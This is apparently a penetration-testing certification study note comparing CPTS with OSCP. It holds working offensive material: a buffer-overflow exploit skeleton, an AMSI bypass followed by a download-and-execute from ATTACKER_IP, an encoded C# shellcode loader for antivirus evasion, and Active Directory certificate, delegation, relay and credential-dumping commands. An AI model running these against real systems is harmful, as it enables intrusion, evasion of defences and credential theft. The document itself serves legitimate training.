---
tags: [oscp-journey, spectre, stage-6, cpts, comparison, advanced]
module: 6
cert-stage: cpts
difficulty: advanced
---

# S6-01 — CPTS vs OSCP — What's Different

## Why CPTS After OSCP

OSCP is the UK hiring gate-keeper. Get it first. Then get CPTS.

CPTS (HTB Certified Penetration Testing Specialist) is technically deeper than OSCP in almost every category: buffer overflows (removed from OSCP 2023), significantly deeper Active Directory (ADCS, delegation, shadow credentials, RBCD), thick client testing, advanced AV evasion, and a 10-day exam producing a full professional report.

**OSCP gives you the job. CPTS makes you better at the job.**

---

## Exam Format Comparison

| Feature | OSCP | CPTS |
|---|---|---|
| Exam window | 23h 45m | 10 days |
| Report | 24h after exam | Within 10 days |
| Format | 3 standalones + 1 AD set | Single black-box engagement, multi-subnet |
| Pass mark | 70% | 85%+ |
| Metasploit | 1 exploit module only | Unrestricted |
| Automated tools | No sqlmap | sqlmap allowed |
| Proctored | Yes | No |
| UK recognition | Very high (hiring gate) | Growing — strong technical credibility |

---

## What CPTS Tests That OSCP Does Not

### 1 — Stack-Based Buffer Overflow (Removed from OSCP 2023)

CPTS still tests 32-bit Linux and Windows BOF. The full chain:

    Step 1: Fuzzing — send increasing buffer sizes until crash
    Step 2: Find offset — pattern_create, send, read EIP, pattern_offset
    Step 3: Control EIP — confirm with BBBB (42424242)
    Step 4: Bad characters — send 0x01-0xFF, identify corruption
    Step 5: Return address — find JMP ESP in non-ASLR module
    Step 6: Build exploit — padding + ret_addr + NOP_sled + shellcode

Generate pattern:

    msf-pattern_create -l 2000
    msf-pattern_offset -q EIP_VALUE -l 2000

Python BOF skeleton:

    import socket
    IP = "TARGET"; PORT = 9999; OFFSET = 1978
    RETN = b"\xXX\xXX\xXX\xXX"   # JMP ESP little-endian
    NOP  = b"\x90" * 16
    SHELLCODE = b"\xbb\x..."       # msfvenom output
    payload = b"A" * OFFSET + RETN + NOP + SHELLCODE
    with socket.socket() as s:
        s.connect((IP, PORT)); s.send(payload)

Windows — mona.py in Immunity Debugger:

    !mona jmp -r esp -cpb "\x00\x0a"     # Find JMP ESP avoiding bad chars
    !mona modules                          # ASLR/DEP status per module
    !mona bytearray -cpb "\x00"           # Generate bad char reference
    !mona compare -f C:\mona\bytearray.bin -a ESP_ADDRESS

---

### 2 — Advanced AV Evasion

OSCP machines have AV disabled. CPTS requires bypassing Windows Defender and AMSI.

AMSI bypass (patches amsi.dll in memory for current session):

    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')

Custom C# shellcode loader (XOR-encoded):

    using System; using System.Runtime.InteropServices;
    class Loader {
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t);
        [DllImport("kernel32.dll")] static extern UInt32 WaitForSingleObject(IntPtr h,UInt32 ms);
        static void Main() {
            byte[] buf = new byte[] { 0xXX, ... };  // XOR-encoded shellcode
            byte key = 0x41;
            for (int i=0; i<buf.Length; i++) buf[i] ^= key;
            IntPtr addr = VirtualAlloc(IntPtr.Zero,(uint)buf.Length,0x3000,0x40);
            System.Runtime.InteropServices.Marshal.Copy(buf,0,addr,buf.Length);
            IntPtr t = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,IntPtr.Zero);
            WaitForSingleObject(t,0xFFFFFFFF);
        }
    }
    # Compile: mcs -out:loader.exe loader.cs

---

### 3 — ADCS Attacks (Active Directory Certificate Services)

Covered in full in PHANTOM/04.5. Quick reference:

Enumerate:

    certipy find -u user@domain.local -p pass -dc-ip DC_IP -stdout
    # Look for: ESC1, ESC2, ESC3, ESC4, ESC6, ESC8

ESC1 — enroll as any user:

    certipy req -u user@domain.local -p pass -ca CA-NAME -template VULN_TEMPLATE -upn administrator@domain.local -dc-ip DC_IP
    certipy auth -pfx administrator.pfx -dc-ip DC_IP
    impacket-psexec domain/administrator@DC_IP -hashes :NTLM_HASH

ESC8 — NTLM relay to ADCS:

    impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    sudo responder -I eth0 -dwv

| ESC | Condition | Technique |
|---|---|---|
| ESC1 | User-supplied SAN in template | Enroll as administrator |
| ESC2 | Any-purpose EKU | Same as ESC1 |
| ESC3 | Enroll on behalf of | Agent cert to DA cert |
| ESC4 | Write access on template | Modify template then ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | ESC1 without template control |
| ESC8 | HTTP enrollment + NTLM relay | Relay to get any account cert |

---

### 4 — Constrained Delegation Abuse

    impacket-findDelegation domain.local/user:pass -dc-ip DC_IP
    impacket-getST domain.local/svc_account:pass -dc-ip DC_IP -spn cifs/TARGET.domain.local -impersonate Administrator
    export KRB5CCNAME=Administrator@cifs_TARGET.ccache
    impacket-psexec -k -no-pass domain.local/Administrator@TARGET.domain.local

---

### 5 — Unconstrained Delegation + Printer Bug

    # On unconstrained delegation machine:
    .\Rubeus.exe monitor /interval:5 /nowrap
    # Trigger coercion from attacker:
    python3 PetitPotam.py UNCONSTRAINED_MACHINE_IP DC_IP
    # Rubeus captures DC TGT — inject and DCSync:
    .\Rubeus.exe ptt /ticket:BASE64_TGT
    impacket-secretsdump -k -no-pass domain.local/DC01\$@dc01.domain.local

---

### 6 — Resource-Based Constrained Delegation (RBCD)

    # Create attacker-controlled machine account
    impacket-addcomputer domain.local/user:pass -dc-ip DC_IP -computer-name ATTACKERPC -computer-pass 'AttackerPass123!'
    # Write RBCD attribute
    impacket-rbcd domain.local/user:pass -dc-ip DC_IP -action write -delegate-from ATTACKERPC$ -delegate-to TARGETPC$
    # Request service ticket impersonating Administrator
    impacket-getST domain.local/ATTACKERPC$:'AttackerPass123!' -dc-ip DC_IP -spn cifs/TARGETPC.domain.local -impersonate Administrator
    export KRB5CCNAME=Administrator@cifs_TARGETPC.domain.local@DOMAIN.LOCAL.ccache
    impacket-psexec -k -no-pass domain.local/Administrator@TARGETPC.domain.local

---

### 7 — Shadow Credentials

    # Have GenericWrite on target account
    python3 pywhisker.py -d domain.local -u youruser -p yourpass --target targetuser --action add --dc-ip DC_IP
    python3 gettgtpkinit.py domain.local/targetuser -cert-pfx targetuser.pfx -pfx-pass PASSWORD targetuser.ccache
    export KRB5CCNAME=targetuser.ccache
    python3 getnthash.py domain.local/targetuser -key SESSION_KEY

---

### 8 — Thick Client Testing

Traffic interception for Java apps:

    java -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8080 -jar app.jar
    certutil -addstore -enterprise Root burp_cert.der   # Trust Burp CA on Windows

Binary analysis:

    # .NET apps: dnSpy (github.com/dnSpy/dnSpy) — full C# source visible
    # Java apps: jadx -d output/ application.jar
    grep -ri "password\|secret\|api_key\|connectionstring" output/

---

## CPTS Exam — The 10-Day Structure

- Days 1-2: Full scope enumeration of all in-scope targets
- Days 2-5: Systematic exploitation and lateral movement
- Days 5-8: Report writing (write while fresh)
- Days 8-10: Review, polish, submit (with buffer)

The report is evaluated by HTB. Pass mark is 85%+. Quality matters as much as flags.

HTB Pro Labs for CPTS prep (in order):

| Lab | Focus |
|---|---|
| Dante | Best overall — wide variety, AD, multiple OSes |
| Offshore | Enterprise AD — closest to exam feel |
| RastaLabs | Advanced AD, evasion, red team |
| Cybernetics | Modern enterprise, EDR evasion |

---

## Quick Reference — CPTS Unique Techniques

    # BOF offset
    msf-pattern_create -l 2000
    msf-pattern_offset -q EIP_VALUE -l 2000

    # ADCS enumeration
    certipy find -u user@domain.local -p pass -dc-ip DC_IP -stdout

    # ESC1
    certipy req -u user@domain.local -p pass -ca CA -template TMPL -upn administrator@domain.local

    # ESC8 relay
    impacket-ntlmrelayx -t http://ADCS/certsrv/certfnsh.asp -smb2support --adcs

    # RBCD — create machine account
    impacket-addcomputer domain.local/user:pass -dc-ip DC_IP -computer-name ATTACKERPC -computer-pass 'P@ss123!'

    # RBCD — set delegation
    impacket-rbcd domain.local/user:pass -dc-ip DC_IP -action write -delegate-from ATTACKERPC$ -delegate-to TARGET$

    # RBCD — get service ticket
    impacket-getST domain.local/ATTACKERPC$:'P@ss123!' -dc-ip DC_IP -spn cifs/TARGET.domain.local -impersonate Administrator

    # Unconstrained delegation monitoring
    .\Rubeus.exe monitor /interval:5 /nowrap

    # Shadow credentials
    certipy shadow auto -u user@domain.local -p pass -account targetuser

    # Constrained delegation
    .\Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET /ptt

    # AMSI bypass
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

---

## Key Differences Summary

| Area | OSCP | CPTS |
|---|---|---|
| Buffer overflow | Removed 2023 | Required |
| ADCS attacks | Not covered | ESC1-ESC8 |
| Constrained delegation | Basic | Full exploitation |
| Unconstrained + Printer Bug | Basic | Full chain |
| RBCD | Introduced | Complete |
| Shadow credentials | Not covered | Covered |
| AV evasion | Basic | AMSI bypass, custom loaders |
| Thick client | Not covered | Covered |
| sqlmap | Banned | Allowed |
| Metasploit | 1 module | Unrestricted |
| Exam duration | 23h 45m | 10 days |

---

## Related Notes
- S6-02 — CPTS Exam Strategy and Report
- PHANTOM/04.5 — ADCS Certificate Abuse
- PHANTOM/04.6 — BloodHound
- PHANTOM/06.2 — Windows Privilege Escalation
